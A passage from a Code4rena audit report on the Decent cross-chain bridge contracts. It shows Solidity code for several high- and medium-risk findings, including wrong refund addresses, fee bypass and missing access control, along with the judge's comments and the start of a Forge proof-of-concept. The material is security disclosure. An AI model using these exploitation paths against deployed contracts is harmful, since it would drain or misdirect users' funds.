Both `_executeWeth` and `_executeEth` have the same issue and funds will be lost when the target call fails, for example `_executeEth` ([Link](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentBridgeExecutor.sol#L63)):

```solidity
	function _executeEth(
	    address from,
	    address target,
	    uint256 amount,
	    bytes memory callPayload
	) private {
	    weth.withdraw(amount);
	    (bool success, ) = target.call{value: amount}(callPayload);
	    if (!success) {
@>	        payable(from).transfer(amount); //@audit wrong address as it uses the source address, not destination
	    }
	}
```

Now, `DecentBridgeAdapter` as a refund address seems wrong, as I disclosed in another issue, but let's suppose that it isn't, as it's possible to prove both scenarios.

[As proof by contradiction](https://en.wikipedia.org/wiki/Proof_by_contradiction), funds should be sent to `DecentBridgeAdapter`, and this would be a non-issue if these contracts are deployed with `CREATE2`, as they would have the same address. But they are not deployed like that.

There is hard evidence that they have different addresses, for example, these are the addresses for `DcntEth` and `DecentEthRouter` in two different chains, which are already deployed:

*   `lib/decent-bridge/actual-deployments/latest/arbitrumAddresses.json`

```js
{
  "arbitrum_DcntEth": "0x8450e1A0DebF76fd211A03c0c7F4DdbB1eEF8A85",
  "done": true,
  "arbitrum_DecentEthRouter": "0x17479B712A1FE1FFaeaf155379DE3ad1440fA99e"
}
```

*   `lib/decent-bridge/actual-deployments/latest/optimismAddresses.json`

```js
{
  "DcntEth": "0x4DB4ea27eA4b713E766bC13296A90bb42C5438D0",
  "done": true,
  "DecentEthRouter": "0x57beDF28C3CB3F019f40F330A2a2B0e0116AA0c2"
}
```

If we take a look at the deploy script for `DecentBridgeAdapter` it also doesn't use `CREATE2`, as there isn't a factory:

```solidity
	function deployDecentBridgeAdapter(
	    address utb,
	    address decentEthRouter,
	    address decentBridgeExecutor
	) internal returns (
	    DecentBridgeAdapter decentBridgeAdapter
	) {
	    string memory chain = vm.envString("CHAIN");
	    bool gasIsEth = gasEthLookup[chain];
	    address weth = wethLookup[chain];
	    address bridgeToken = gasIsEth ? address(0) : weth;

@>	    decentBridgeAdapter = new DecentBridgeAdapter(gasIsEth, bridgeToken);
	    decentBridgeAdapter.setUtb(utb);
	    decentBridgeAdapter.setRouter(decentEthRouter);
	    decentBridgeAdapter.setBridgeExecutor(decentBridgeExecutor);
	    UTB(payable(utb)).registerBridge(address(decentBridgeAdapter));
	}
```

So these funds will be sent to a random address in any case.

### Recommended Mitigation Steps

The `executor.execute` call in `DecentEthRouter.onOFTReceived` should be changed to an appropriate address (**e.g. the user refund address**) instead of using `_from`:

```solidity
	} else {
	    weth.approve(address(executor), _amount);
	    executor.execute(_from, _to, deliverEth, _amount, callPayload);
	}
```

**[0xsomeone (Judge) commented](https://github.com/code-423n4/2024-01-decent-findings/issues/436#issuecomment-1924325469):**
 > The Warden has detailed how the encoding of the cross-chain payload will use an incorrect `_from` parameter under normal operating conditions, leading to failed transfers at the target chain refunding the wrong address.
> 
> This submission was selected as the best given that it precisely details that the `_from` address is known to be incorrect at all times when the protocol is used normally.
> 
> A high-risk rating is appropriate as any failed call will lead to **full fund loss for the cross-chain call**.

**[wkantaros (Decent) confirmed](https://github.com/code-423n4/2024-01-decent-findings/issues/436#issuecomment-1942661007)**

***

## [[H-04] Users will lose their cross-chain transaction if the destination router do not have enough WETH reserves.](https://github.com/code-423n4/2024-01-decent-findings/issues/59)
*Submitted by [haxatron](https://github.com/code-423n4/2024-01-decent-findings/issues/59), also found by [EV\_om](https://github.com/code-423n4/2024-01-decent-findings/issues/698), [MrPotatoMagic](https://github.com/code-423n4/2024-01-decent-findings/issues/602), [deth](https://github.com/code-423n4/2024-01-decent-findings/issues/577), [rouhsamad](https://github.com/code-423n4/2024-01-decent-findings/issues/478), [Aamir](https://github.com/code-423n4/2024-01-decent-findings/issues/410), [Topmark](https://github.com/code-423n4/2024-01-decent-findings/issues/445), and [bart1e](https://github.com/code-423n4/2024-01-decent-findings/issues/354)*

When the DecentEthRouter receives the dcntEth OFT token from a cross-chain transaction, if the WETH balance of the destination router is less than amount of dcntEth received (this could be due to the router receiving more cross-chain transactions than than sending cross-chain transactions which depletes its WETH reserves), then the dcntEth will get transferred to the address specified by `_to`.

[DecentEthRouter.sol#L266-L281](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L266-L281)

```solidity
    function onOFTReceived(
        uint16 _srcChainId,
        bytes calldata,
        uint64,
        bytes32,
        uint _amount,
        bytes memory _payload
    ) external override onlyLzApp {
        ...
        if (weth.balanceOf(address(this)) < _amount) {
=>          dcntEth.transfer(_to, _amount);
            return;
        }

        if (msgType == MT_ETH_TRANSFER) {
            if (!gasCurrencyIsEth || !deliverEth) {
                weth.transfer(_to, _amount);
            } else {
                weth.withdraw(_amount);
                payable(_to).transfer(_amount);
            }
        } else {
            weth.approve(address(executor), _amount);
            executor.execute(_from, _to, deliverEth, _amount, callPayload);
        }
    }
```

This dcntEth is sent to the user so that they can either redeem the WETH / ETH from the router once the WETH balance is refilled or send it back to the source chain to redeem back the WETH.

The problem is that if the msgType != MT_ETH_TRANSFER, then the `_to` address is not the user, it is instead the target meant to be called by the destination chain's bridge executor (if the source chain uses a decent bridge adapter, the target is always the destination chain's bridge adapter which does not have a way to withdraw the dcntEth).

The following snippet shows what occurs in the bridge executor (`_executeEth` omitted as it does largely the same thing as `_executeWeth`):

[DecentBridgeExecutor.sol#L24-L82](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentBridgeExecutor.sol#L24-L82)

```solidity
    function _executeWeth(
        address from,
        address target,
        uint256 amount,
        bytes memory callPayload
    ) private {
        uint256 balanceBefore = weth.balanceOf(address(this));
        weth.approve(target, amount);

        (bool success, ) = target.call(callPayload);

        if (!success) {
            weth.transfer(from, amount);
            return;
        }

        uint256 remainingAfterCall = amount -
            (balanceBefore - weth.balanceOf(address(this)));

        // refund the sender with excess WETH
        weth.transfer(from, remainingAfterCall);
    }
    ...
    function execute(
        address from,
        address target,
        bool deliverEth,
        uint256 amount,
        bytes memory callPayload
    ) public onlyOwner {
        weth.transferFrom(msg.sender, address(this), amount);

        if (!gasCurrencyIsEth || !deliverEth) {
            _executeWeth(from, target, amount, callPayload);
        } else {
            _executeEth(from, target, amount, callPayload);
        }
    }
```

Therefore, once the dcntEth is transferred to the execution target (which is almost always the destination chain bridge adapter, see Appendix for the code walkthrough). The user cannot do anything to retrieve the dcntEth out of the execution target, so the cross-chain transaction is lost.

### Recommended Mitigation Steps

Pass a destination chain refund address into the payload sent cross-chain and replace the `_to` address used in [DecentEthRouter.sol#L267](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L267):

```solidity
        if (weth.balanceOf(address(this)) < _amount) {
        // REPLACE '_to' with the destination chain refund address
=>          dcntEth.transfer(_to, _amount);
            return;
        }
```



<details> <summary> Appendix </summary>

To see why the target is always the destination bridge adapter if the source chain is a decent bridge adapter:

UTB.sol will first call the `bridge` function in the adapter with the destination bridge adapter address as the 2nd argument.

[DecentBridgeAdapter.sol#L117C1-L124C11](https://github.com/code-423n4/2024-01-decent/blob/main/src/bridge_adapters/DecentBridgeAdapter.sol#L117C1-L124C11)

```solidity
    function bridge(
        ...
        router.bridgeWithPayload{value: msg.value}(
            lzIdLookup[dstChainId],
            destinationBridgeAdapter[dstChainId],
            swapParams.amountIn,
            false,
            dstGas,
            bridgePayload
        );
    }
```

Which calls the below function in the router, where the `_toAddress` is the 2nd argument and therefore is the destination bridge adapter address:

[DecentEthRouter.sol#L196C1-L204C23](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L196C1-L204C23)

```solidity
    /// @inheritdoc IDecentEthRouter
    function bridgeWithPayload(
        uint16 _dstChainId,
        address _toAddress,
        uint _amount,
        bool deliverEth,
        uint64 _dstGasForCall,
        bytes memory additionalPayload
    ) public payable {
           return
            _bridgeWithPayload(
                MT_ETH_TRANSFER_WITH_PAYLOAD,
                _dstChainId,
                _toAddress,
                _amount,
                _dstGasForCall,
                additionalPayload,
                deliverEth
            );
           ...
```

which calls `_bridgeWithPayload` which calls `_getCallParams` to encode the payload to send to the destination chain:

[DecentEthRouter.sol#L148C1-L168C15](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L148C1-L168C15)

```solidity
    function _bridgeWithPayload(
        uint8 msgType,
        uint16 _dstChainId,
        address _toAddress,
        uint _amount,
        uint64 _dstGasForCall,
        bytes memory additionalPayload,
        bool deliverEth
    ) internal {
        (
            bytes32 destinationBridge,
            bytes memory adapterParams,
            bytes memory payload
        ) = _getCallParams(
                msgType,
                _toAddress,
                _dstChainId,
                _dstGasForCall,
                deliverEth,
                additionalPayload
            );
            ...
```

The `_toAddress` parameter is always the 3rd parameter in the payload sent.

[DecentEthRouter.sol#L101-L110](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L101-L110)

            function _getCallParams
            ...
            if (msgType == MT_ETH_TRANSFER) {
                payload = abi.encode(msgType, msg.sender, _toAddress, deliverEth);
            } else {
                payload = abi.encode(
                    msgType,
                    msg.sender,
                    _toAddress,
                    deliverEth,
                    additionalPayload
                );
            }
            ...

Which matches `_to` variable in `onOFTReceived`

[DecentEthRouter.sol#L236](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L236)

```solidity
    /// @inheritdoc IOFTReceiverV2
    function onOFTReceived(
        uint16 _srcChainId,
        bytes calldata,
        uint64,
        bytes32,
        uint _amount,
        bytes memory _payload
    ) external override onlyLzApp {
        (uint8 msgType, address _from, address _to, bool deliverEth) = abi
            .decode(_payload, (uint8, address, address, bool));

        bytes memory callPayload = "";

        if (msgType == MT_ETH_TRANSFER_WITH_PAYLOAD) {
            (, , , , callPayload) = abi.decode(
                _payload,
                (uint8, address, address, bool, bytes)
            );
        }
        ...
```
</details>


**[wkantaros (Decent) confirmed but disagreed with severity](https://github.com/code-423n4/2024-01-decent-findings/issues/59#issuecomment-1917406086)**

**[0xsomeone (Judge) commented](https://github.com/code-423n4/2024-01-decent-findings/issues/59#issuecomment-1924077034):**
 > This and all duplicate submissions detail an interesting way in which cross-chain relays will fail to properly invoke the target recipient of the relayed call, effectively leading to loss of funds as the assets will be transferred to an entity that potentially is not equipped to handle the token. 
> 
> Based on discussions in [#505](https://github.com/code-423n4/2024-01-decent-findings/issues/505), this is a very likely scenario and thus a high-risk severity is appropriate as the vulnerability should manifest consistently in non-Ethereum chains.

***
 
# Medium Risk Findings (5)
## [[M-01] Permanent loss of tokens if swap data gets outdated](https://github.com/code-423n4/2024-01-decent-findings/issues/665)
*Submitted by [windhustler](https://github.com/code-423n4/2024-01-decent-findings/issues/665), also found by [monrel](https://github.com/code-423n4/2024-01-decent-findings/issues/684), [nuthan2x](https://github.com/code-423n4/2024-01-decent-findings/issues/598), and [imare](https://github.com/code-423n4/2024-01-decent-findings/issues/285)*

While sending funds through `StargateBridgeAdapter`, the user passes the swap data as a parameter. The flow is stargate sending tokens on the receiving chain into the `StargateBridgeAdapter` and executing `sgReceive`.

The issue here is that `sgReceive` will fail if the swap data gets outdated, but this is not going to make the whole transaction revert.

Stargate will still send the tokens to the `StargateBridgeAdapter`, and if the `sgReceive` fails, the swap will be cached for later execution.
See `StargateComposer` logic here: <https://stargateprotocol.gitbook.io/stargate/stargate-composability/stargatecomposer.sol#sgreceive>.

Now, tokens will be left sitting in the `StargateBridgeAdapter` contract, and since the user can only retry the transaction with the same swap data, the tokens will be stuck forever.

The impact is loss of transferred tokens for the user.

### Proof of Concept

Consider the following flow:

1.  User invokes `StargateBridgeAdapter:bridge()` function as part of the whole flow of calling `UTB:bridgeAndExecute()` function.
2.  He is passing the swapData parameters to the remote chain.
3.  `StargateComposer` first transfers the tokens to the `StargateBridgeAdapter` contract.
4.  After that the `StargateBridgeAdapter:sgReceive()` function is executed.
5.  It then calls `UTB:receiveFromBridge` that tries to execute the swap.
6.  If the swap fails, which can frequently occur due to the fact that the swap data is outdated, most commonly minimum amount out gets outdated.
7.  The whole payload gets stored inside the `StargateComposer` contract, and the tokens are left in the `StargateBridgeAdapter` contract.
8.  As the user can only retry the transaction with the same payload, the tokens will be stuck forever.
9.  An example of StargateComposer contract can be seen on: <https://stargateprotocol.gitbook.io/stargate/developers/contract-addresses/mainnet#ethereum>

Note: The application needs to use the `StargateComposer` contract as opposed to StargateRouter because it is transferring funds with payload, i.e. it executes `sgReceive` on the receiving chain.
You can  only use `StargateRouter` directly if you're sending funds empty payload.
More on it: <https://stargateprotocol.gitbook.io/stargate/stargate-composability>

### Recommended Mitigation Steps

Wrap the whole `StargateBridgeAdapter:receiveFromBridge()` call into a try/catch and if it reverts send the transferred tokens back to the user.

**[wkantaros (Decent) confirmed](https://github.com/code-423n4/2024-01-decent-findings/issues/665#issuecomment-1919408463)**

**[0xsomeone (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-decent-findings/issues/665#issuecomment-1921162273):**
 > The Warden has demonstrated that it is possible for a Stargate-based cross-chain interaction to fail at the swap level perpetually.
> 
> While the `StargateComposer::clearCachedSwap` function exists to retry the same payload, as the Warden states, a sharp market event (i.e. token launch that leads to an upward trend or market crash that leads to a downward event) can cause the swap to fail.
> 
> Theoretically, the tokens can be rescued using a flash-loan if they are substantial, however, this would be very unconventional and not a real mitigation to the issue. The proposed solution by the Warden is adequate.
> 
> I believe a severity of Medium is more appropriate as the vulnerability relies on external requirements (i.e. a sharp market event), the maximum impact is the user's own funds, and when users specify slippage (i.e. minimum output) they usually factor in the time it takes for a transaction to execute. Network congestion, market events, and cross-chain relay delays all play a role in whether the vulnerability manifests but present external requirements.

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-01-decent-findings/issues/665)._

***

## [[M-02] Users can use the protocol freely without paying any fees by calling the `DecentEthRouter::bridgeWithPayload()` function directly.](https://github.com/code-423n4/2024-01-decent-findings/issues/647)
*Submitted by [NPCsCorp](https://github.com/code-423n4/2024-01-decent-findings/issues/647), also found by [Soliditors](https://github.com/code-423n4/2024-01-decent-findings/issues/279), [peanuts](https://github.com/code-423n4/2024-01-decent-findings/issues/221), [nmirchev8](https://github.com/code-423n4/2024-01-decent-findings/issues/66), and [haxatron](https://github.com/code-423n4/2024-01-decent-findings/issues/51)*

### The execution flow of `bridgeAndExecute` function

To understand the vulnerability, we need to understand the execution flow of the [`bridgeAndExecute()`](https://github.com/code-423n4/2024-01-decent/blob/main/src/UTB.sol#L259-L274) function, at least a small portion of it.

When the user wants to bridge tokens of him and execute an action on another chain, he will need to execute the [`UTB::bridgeAndExecute()`](https://github.com/code-423n4/2024-01-decent/blob/main/src/UTB.sol#L259-L274) function.

Suppose the user exists in Polygon, he has USDC and he wants to mint an NFT in Optimism which costs 1000 DAI. What will happen is that the protocol will first, in polygon, swap the user's USDC with WETH, then bridge the WETH to Optimism, then swap the WETH with DAI and then execute the arbitrary call the user wants to execute, which will be to mint the NFT in exchange for the resulting 1000 DAI from the post-bridge swap operation.

When this function is called, the following will happen:

1.  Step 1: When the user calls the [`UTB::bridgeAndExecute()`](https://github.com/code-423n4/2024-01-decent/blob/main/src/UTB.sol#L259-L274) function, it will do three things: first, it will collect the fees by calling the [`UTBFeeCollector:collectFees()`](https://github.com/code-423n4/2024-01-decent/blob/main/src/UTB.sol#L228-L251) function, secondly, it will conduct the pre-bridge swap operation (occurs in the source destination), it will swap the user's USDC to WETH. thirdly, it will modify the `swapInstructions` which the user supplied to prepare for the post-bridge swap. Then after all of the 3 operations take place, it will invoke the [`UTB::callBridge()`](https://github.com/code-423n4/2024-01-decent/blob/main/src/UTB.sol#L282-L301) function.

2.  Step 2: In the [`UTB::callBridge()`](https://github.com/code-423n4/2024-01-decent/blob/main/src/UTB.sol#L282-L301) function, some approvals are granted to the `DecentBridgeAdapter` contract, and then the it will invoke the function [`DecentBridgeAdapter::bridge()`](https://github.com/code-423n4/2024-01-decent/blob/main/src/bridge_adapters/DecentBridgeAdapter.sol#L81-L125) in the `DecentBridgeAdapter` contract.

3.  Step 3: In the [`DecentBridgeAdapter::bridge()`](https://github.com/code-423n4/2024-01-decent/blob/main/src/bridge_adapters/DecentBridgeAdapter.sol#L81-L125) function, some data like the post-bridge swap payload and bridge payload (what to execute when the TX reaches destination) will be encoded, then it will reach out to the [`DecentEthRouter`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol) contract and invoke the function [`DecentEthRouter::bridgeWithPayload`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L197-L215)

4.  Step 4: When the execution reaches the [`DecentEthRouter::bridgeWithPayload`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L197-L215) function, an internal function containing the actual logic, with the same name will also be called: [`DecentEthRouter::_bridgeWithPayload`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L148-L194)

    **Note: Notice that the \`DecentEthRouter::bridgeWithPayload() function isn't protected by any modifiers, any body can call it directly**

5.  Step 5: When the execution gets inside the [`DecentEthRouter::_bridgeWithPayload`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L148-L194) function, the function will prepare the `LzCallParams` for the layerzero call and the actual bridging will happen when the [`dcntEth::sendAndCall`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L185) function is actually invoked.

6.  Step 6: The bridging process kickstarts and the execution flow is continued in the destination chain.

Here is a graph of the execution flow

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-decent-findings/issues/647).*

### The vulnerability & PoC

The vulnerability is that any user can conduct the pre-bridge swap operation using uniswap by himself, prepare the right calldata and call the function [`DecentEthRouter::bridgeWithPayload`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L197-L215) directly (since anybody can call it), doing so will allow the user to bypass the fee collection process completely.

The fee collection as mentioned in the previously detailed execution flow, happens when the user first calls the [`bridgeAndExecute()`](https://github.com/code-423n4/2024-01-decent/blob/main/src/UTB.sol#L259-L274) function. But as I mentioned, nothing really forces him to start execution from there. All that function does is collect the fees, conduct the pre-bridge swap operation and prepare the proper call data. The user can conduct the pre-bridge swap operation himself, prepare the proper calldata and talk directly to the [`DecentEthRouter::bridgeWithPayload`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L197-L215) function, effecitvely bypassing fee collection.

Anybody can call the [`DecentEthRouter::bridgeWithPayload`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L197-L215) directly, and the protocol has no mechanism of determining whether or not the user is using the protocol with or without paying fees.

### Impact

Users can use the protocol without paying any fees.

### Recommended Mitigation Steps

Tighten up the access control on the [`DecentEthRouter::bridgeWithPayload`](https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L197-L215) function. Allow only the DecentBridgeAdapter to call the bridgeWithPayload() function.

***

Found & reported by: sin1st3r\_\_

Team: NPCsCorp

**[0xsomeone (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-decent-findings/issues/647#issuecomment-1924205171):**
 > The Warden has demonstrated that it is possible to bypass Decent fees when performing bridging operations by directly interacting with the `DecentEthRouter`. This is indeed a valid concern and has been confirmed by the Sponsor.
> 
> I believe a severity of medium is more appropriate given that uncaptured profit is solely affected.

**[wkantaros (Decent) confirmed](https://github.com/code-423n4/2024-01-decent-findings/issues/647#issuecomment-1942666822)**

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-01-decent-findings/issues/647)._

***

## [[M-03] Missing access control on UTB:receiveFromBridge allows UTB swaps to be executed without spending bridge fees while bypassing fee/swap instruction signature verification](https://github.com/code-423n4/2024-01-decent-findings/issues/590)
*Submitted by [GhK3Ndf](https://github.com/code-423n4/2024-01-decent-findings/issues/590), also found by [dutra](https://github.com/code-423n4/2024-01-decent-findings/issues/749), [CDSecurity](https://github.com/code-423n4/2024-01-decent-findings/issues/655), [Aymen0909](https://github.com/code-423n4/2024-01-decent-findings/issues/639), [0xAadi](https://github.com/code-423n4/2024-01-decent-findings/issues/494), [Eeyore](https://github.com/code-423n4/2024-01-decent-findings/issues/491), [DadeKuma](https://github.com/code-423n4/2024-01-decent-findings/issues/437), [pkqs90](https://github.com/code-423n4/2024-01-decent-findings/issues/234), [th13vn](https://github.com/code-423n4/2024-01-decent-findings/issues/215), [Soliditors](https://github.com/code-423n4/2024-01-decent-findings/issues/194), [bart1e](https://github.com/code-423n4/2024-01-decent-findings/issues/185), [NentoR](https://github.com/code-423n4/2024-01-decent-findings/issues/161), [Kow](https://github.com/code-423n4/2024-01-decent-findings/issues/120), [0xDING99YA](https://github.com/code-423n4/2024-01-decent-findings/issues/102), [antonttc](https://github.com/code-423n4/2024-01-decent-findings/issues/50), [haxatron](https://github.com/code-423n4/2024-01-decent-findings/issues/15), [Matue](https://github.com/code-423n4/2024-01-decent-findings/issues/750), [0xdedo93](https://github.com/code-423n4/2024-01-decent-findings/issues/694), [SovaSlava](https://github.com/code-423n4/2024-01-decent-findings/issues/290), [peanuts](https://github.com/code-423n4/2024-01-decent-findings/issues/217), and [MrPotatoMagic](https://github.com/code-423n4/2024-01-decent-findings/issues/214)*

Users can abuse the public [`UTB:receiveFromBridge`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L311) function's lack of access control to directly call the internal [`UTB:_swapAndExecute`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L134) function.

This bypasses the [`UTB:retrieveAndCollectFees`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L228) modifier, which is used to collect fees from UTB users and validate fee and swap instructions via [`UTBFeeCollector:collectFees`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTBFeeCollector.sol#L44) in all other public swap/bridge functions (namely [`UTB:swapAndExecute`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L115) and [`UTB:bridgeAndExecute`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L266)).

This allows users to execute inter-chain swaps without spending bridge fees, using instructions that have not been signed by a validator key. Unsigned additional payloads can also be included in the swap instruction's `payload` element, which would then be executed by the [`UTBExecutor:execute`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTBExecutor.sol#L19) function.

### Root Cause

### Missing access control in `UTB:receiveFromBridge`

`UTB:receiveFromBridge` is likely missing an access control modifier.

Note that the missing modifier may not be the \[`UTB:retrieveAndCollectFees`] modifier, as this modifier is understood to be intended for checking the UTB swap/bridge instructions on the source chain. Refer to the remedial suggestions for an alternate means of access control.

**[`UTB:receiveFromBridge`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTB.sol#L311)**

<details>

```solidity

//File:src/UTB.sol

contract UTB is Owned {

    ...

    function receiveFromBridge(
        SwapInstructions memory postBridge,
        address target,
        address paymentOperator,
        bytes memory payload,
        address payable refund
    ) public { // missing retrieveAndCollect modifier
        _swapAndExecute(postBridge, target, paymentOperator, payload, refund);
    }

    ...

    // if a feeCollector has been set, then this modifier validates the fee struct against the signer:

    modifier retrieveAndCollectFees(
        FeeStructure calldata fees,
        bytes memory packedInfo,
        bytes calldata signature
    ) {
        if (address(feeCollector) != address(0)) {
            uint value = 0;
            if (fees.feeToken != address(0)) {
                IERC20(fees.feeToken).transferFrom(
                    msg.sender,
                    address(this),
                    fees.feeAmount
                );
                IERC20(fees.feeToken).approve(
                    address(feeCollector),
                    fees.feeAmount
                );
            } else {
                value = fees.feeAmount;
            }
            feeCollector.collectFees{value: value}(fees, packedInfo, signature);
        }
        _;
    }

    ...
    
    // swapAndExecute/bridgeAndExecute functions both validate fees/instructions signatures via retrieveAndCollectFees modifier

    function swapAndExecute(
        SwapAndExecuteInstructions calldata instructions,
        FeeStructure calldata fees,
        bytes calldata signature
    )
        public
        payable
        retrieveAndCollectFees(fees, abi.encode(instructions, fees), signature)
    {
        _swapAndExecute(
            instructions.swapInstructions,
            instructions.target,
            instructions.paymentOperator,
            instructions.payload,
            instructions.refund
        );
    }

    function bridgeAndExecute(
        BridgeInstructions calldata instructions,
        FeeStructure calldata fees,
        bytes calldata signature
    )
        public
        payable
        retrieveAndCollectFees(fees, abi.encode(instructions, fees), signature)
        returns (bytes memory)
    {
        (
            uint256 amt2Bridge,
            BridgeInstructions memory updatedInstructions
        ) = swapAndModifyPostBridge(instructions);
        return callBridge(amt2Bridge, fees.bridgeFee, updatedInstructions);
    }

    ...

    // _swapAndExecute directly bypasses any signature/fee checks before the swap/payload is executed.

    function _swapAndExecute(
        SwapInstructions memory swapInstructions,
        address target,
        address paymentOperator,
        bytes memory payload,
        address payable refund
    ) private {
        (address tokenOut, uint256 amountOut) = performSwap(swapInstructions);
        if (tokenOut == address(0)) {
            executor.execute{value: amountOut}(
                target,
                paymentOperator,
                payload,
                tokenOut,
                amountOut,
                refund
            );
        } else {
            IERC20(tokenOut).approve(address(executor), amountOut);
            executor.execute(
                target,
                paymentOperator,
                payload,
                tokenOut,
                amountOut,
                refund
            );
        }
    }

}
```
</details>

**[`UTBFeeCollector:collectFees`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTBFeeCollector.sol#L44)**

<details>

```solidity

//File:src/UTBFeeCollector.sol

    function collectFees(
        FeeStructure calldata fees,
        bytes memory packedInfo,
        bytes memory signature
    ) public payable onlyUtb {
        bytes32 constructedHash = keccak256(
            abi.encodePacked(BANNER, keccak256(packedInfo))
        );
        (bytes32 r, bytes32 s, uint8 v) = splitSignature(signature);
        address recovered = ecrecover(constructedHash, v, r, s);
        require(recovered == signer, "Wrong signature");
        if (fees.feeToken != address(0)) {
            IERC20(fees.feeToken).transferFrom(
                utb,
                address(this),
                fees.feeAmount
            );
        }
    }
```

</details>

**[`UTBExecutor:execute`](https://github.com/code-423n4/2024-01-decent/blob/011f62059f3a0b1f3577c8ccd1140f0cf3e7bb29/src/UTBExecutor.sol#L19)**

<details>

```solidity

//File:src/UTBExecutor.sol:

contract UTBExecutor is Owned {
   
    ...

    function execute(
        address target,
        address paymentOperator,
        bytes memory payload,
        address token,
        uint amount,
        address payable refund
    ) public payable onlyOwner {
        return
            execute(target, paymentOperator, payload, token, amount, refund, 0);
    }

    ...

    function execute(
        address target,
        address paymentOperator,
        bytes memory payload,
        address token,
        uint amount,
        address payable refund,
        uint extraNative
    ) public onlyOwner {
        bool success;
        if (token == address(0)) {
            (success, ) = target.call{value: amount}(payload);
            if (!success) {
                (refund.call{value: amount}(""));
            }
            return;
        }

        uint initBalance = IERC20(token).balanceOf(address(this));

        IERC20(token).transferFrom(msg.sender, address(this), amount);
        IERC20(token).approve(paymentOperator, amount);

        if (extraNative > 0) {
            (success, ) = target.call{value: extraNative}(payload);
            if (!success) {
                (refund.call{value: extraNative}(""));
            }
        } else {
            (success, ) = target.call(payload);
        }

        uint remainingBalance = IERC20(token).balanceOf(address(this)) -
            initBalance;

        if (remainingBalance == 0) {
            return;
        }

        IERC20(token).transfer(refund, remainingBalance);
    }
}

```

</details>

### Proof of Concept

The following Forge PoC test suite includes the following tests which demonstrates this issue, against a UTB/decent-bridge deployment on the Arbitrum and Polygon network chains, deployed via the provided helper functions in the repo test suite.

**`UTBReceiveFromBridge` Forge test contract:**

<details>

```solidity

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ERC20} from "solmate/tokens/ERC20.sol";
import {UTB, SwapInstructions, SwapAndExecuteInstructions, FeeStructure} from "../src/UTB.sol";
import {UTBExecutor} from "../src/UTBExecutor.sol";
import {UniSwapper} from "../src/swappers/UniSwapper.sol";
import {SwapParams} from "../src/swappers/SwapParams.sol";
import {XChainExactOutFixture} from "./helpers/XChainExactOutFixture.sol";
import {UTBCommonAssertions} from "../test/helpers/UTBCommonAssertions.sol";
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import {IDcntEth} from "lib/decent-bridge/src/interfaces/IDcntEth.sol";
import {IDecentBridgeExecutor} from "lib/decent-bridge/src/interfaces/IDecentBridgeExecutor.sol";
import {IDecentEthRouter} from "lib/decent-bridge/src/interfaces/IDecentEthRouter.sol";
import {DcntEth} from "lib/decent-bridge/src/DcntEth.sol";
import {DecentBridgeExecutor} from "lib/decent-bridge/src/DecentBridgeExecutor.sol";
import {DecentEthRouter} from "lib/decent-bridge/src/DecentEthRouter.sol";
import {IUTB} from "../src/interfaces/IUTB.sol";
import {IUTBExecutor} from "../src/interfaces/IUTBExecutor.sol";
